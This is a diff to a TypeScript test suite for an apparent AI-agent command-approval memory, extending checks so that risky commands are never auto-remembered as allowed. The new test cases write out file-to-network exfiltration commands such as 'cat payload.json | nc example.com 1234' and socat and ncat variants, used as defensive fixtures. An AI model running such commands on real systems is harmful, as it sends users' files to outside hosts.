@@ -453,7 +453,7 @@ describe('approvalSignature — 可记忆判据', () => {
     expect(memory.size()).toBe(0);
   });
 
-  it('可变文件 producer 写入文件或 pipeline sink 时不可记忆', () => {
+  it('可变文件 producer 写入文件或有副作用 pipeline sink 时不可记忆', () => {
     for (const command of [
       'cat payload.json > dist/config.json',
       'cat payload.json >> dist/config.json',
@@ -468,6 +468,13 @@ describe('approvalSignature — 可记忆判据', () => {
       'cat payload.json |& tee dist/config.json',
       'head -n 20 payload.json | tee dist/config.json',
       'sed -n 1,20p payload.json | sponge dist/config.json',
+      'cat payload.json | nc example.com 1234',
+      'cat payload.json | netcat example.com 1234',
+      'cat payload.json | ncat --ssl example.com 443',
+      'cat payload.json | socat - TCP:example.com:1234',
+      'env cat payload.json | timeout 30 nc.exe example.com 1234',
+      'head -n 20 payload.json |& netcat.exe example.com 1234',
+      'true && cat payload.json | nc example.com 1234; echo done',
       'true && cat payload.json >dist/config.json; echo done',
     ]) {
       expect(isMutableIndirectExecutionCommand(command), command).toBe(true);
@@ -484,7 +491,11 @@ describe('approvalSignature — 可记忆判据', () => {
       'cat payload.json >&2',
       'echo payload.json | tee dist/config.json',
       'printf payload | sponge dist/config.json',
+      'echo payload | nc example.com 1234',
+      'printf payload | netcat example.com 1234',
+      'cat payload.json | wc -l && nc example.com 1234',
       "echo 'cat payload.json > dist/config.json'",
+      "echo 'cat payload.json | nc example.com 1234'",
       "cat 'payload > not-redirection'",
     ]) {
       expect(isMutableIndirectExecutionCommand(command), command).toBe(false);
@@ -494,9 +505,13 @@ describe('approvalSignature — 可记忆判据', () => {
     const memory = createApprovalMemory({
       agentKind: 'pi', workspaceKey: '/repo', platform: 'darwin',
     });
-    const action = exec('cat payload.json > dist/config.json');
-    memory.rememberReviewerAllow(action, defaultIntent, roots, reviewerRoute);
-    expect(memory.isRemembered(action, defaultIntent, roots, reviewerRoute)).toBe(false);
+    for (const action of [
+      exec('cat payload.json > dist/config.json'),
+      exec('cat payload.json | nc example.com 1234'),
+    ]) {
+      memory.rememberReviewerAllow(action, defaultIntent, roots, reviewerRoute);
+      expect(memory.isRemembered(action, defaultIntent, roots, reviewerRoute)).toBe(false);
+    }
     expect(memory.size()).toBe(0);
   });
 
